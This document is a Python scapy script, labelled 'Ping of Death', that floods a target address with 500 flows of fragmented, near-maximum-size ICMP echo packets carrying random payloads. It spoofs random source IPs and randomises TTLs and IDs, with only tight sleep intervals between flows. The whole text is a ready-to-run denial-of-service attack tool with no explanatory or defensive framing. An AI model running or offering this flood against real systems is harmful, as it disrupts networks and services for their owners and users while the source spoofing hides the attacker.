from scapy.all import *
import random
import time
import struct

TARGET_IP = "192.168.1.1"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 15

print(f"[*] Starting Ping of Death -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    src_ip    = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    ttl       = random.randint(32, 128)
    flow_id   = random.randint(1, 65535)
    packets   = random.randint(MIN_PACKETS, MAX_PACKETS)
    icmp_id   = random.randint(0, 65535)

    iat_min   = random.uniform(0.00001, 0.0005)
    iat_max   = random.uniform(iat_min + 0.0001, 0.001)

    raw_frag  = random.randint(400, 1480)
    frag_size = (raw_frag // 8) * 8
    frag_size = max(frag_size, 400)

    for p in range(packets):
        payload_size = random.randint(60000, 63000)
        full_payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        icmp_header = struct.pack("!BBHHH",
            8, 0, 0, icmp_id, p
        )
        icmp_data = icmp_header + full_payload

        offset = 0
        frags  = []
        while offset < len(icmp_data):
            chunk   = icmp_data[offset: offset + frag_size]
            is_last = (offset + frag_size) >= len(icmp_data)

            frag_pkt = IP(
                src   = src_ip,
                dst   = TARGET_IP,
                ttl   = ttl,
                proto = 1,
                id    = flow_id,
                flags = 0 if is_last else 1,
                frag  = offset // 8
            ) / Raw(load=chunk)

            frags.append(frag_pkt)
            offset += frag_size

        # Use send() not sendp() — handles routing and MAC automatically
        send(frags, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.001, 0.005))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")